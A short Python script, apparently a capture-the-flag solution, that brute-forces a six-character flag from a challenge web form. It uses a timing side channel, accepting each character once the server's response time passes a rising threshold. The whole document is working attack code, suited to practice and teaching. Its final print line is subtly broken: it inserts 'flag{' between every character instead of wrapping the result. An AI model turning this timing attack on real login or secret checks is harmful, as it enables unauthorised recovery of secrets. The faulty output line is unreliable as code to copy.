import requests

url = "http://time-is-key.challs.olicyber.it/index.php"
flag = list("aaaaaa")

letters = "abcdefghijklmnopqrstuvwxyz0123456789"

r = requests.Session()

for i in range(6):
    for c in letters:
        tmp  = "".join(flag[:i] + [c] + flag[i+1:])
        payload = {"flag" : tmp}

        res = r.post(url, data=payload)
        if res.elapsed.total_seconds() > (0.5 + i):
            flag[i] = c
            print(f"({i+1}) Found: {c}")
            break

print("flag{".join(flag) + "}")